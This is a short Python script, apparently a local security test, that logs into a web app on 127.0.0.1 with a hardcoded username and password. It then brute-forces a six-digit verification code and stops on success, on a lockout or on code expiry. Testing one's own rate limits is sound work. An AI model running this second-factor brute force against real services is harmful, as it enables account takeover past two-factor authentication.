import requests

# 使用已知凭据登录（绕过真实用户操作，模拟进入验证码阶段）
session = requests.Session()
login_url = "http://127.0.0.1:5000/"
verify_url = "http://127.0.0.1:5000/verify"

# 填入真实存在的用户名和密码
username = "yihan"
password = "lyh2002626"  # 请确保这是正确密码！

# 第一步：登录获取验证码界面
login_response = session.post(login_url, data={
    "username": username,
    "password": password
})

if "verify" not in login_response.url:
    print("❌ Login failed. Cannot reach verification step.")
    exit()

print("✅ Login succeeded. Starting code brute force...")

# 第二步：暴力破解6位验证码（000000 到 999999）
for i in range(1000000):
    code = str(i).zfill(6)  # 补齐6位，例如000001
    response = session.post(verify_url, data={"code": code})

    print(f"Trying code: {code} → Response: {response.text[:60]}")

    if "query" in response.url:
        print(f"✅ Code cracked: {code}")
        break

    if "Too many incorrect attempts" in response.text:
        print("🚫 Reached attempt limit. System blocked further attempts.")
        break

    if "expired" in response.text:
        print("⏰ Code expired. Need to relogin.")
        break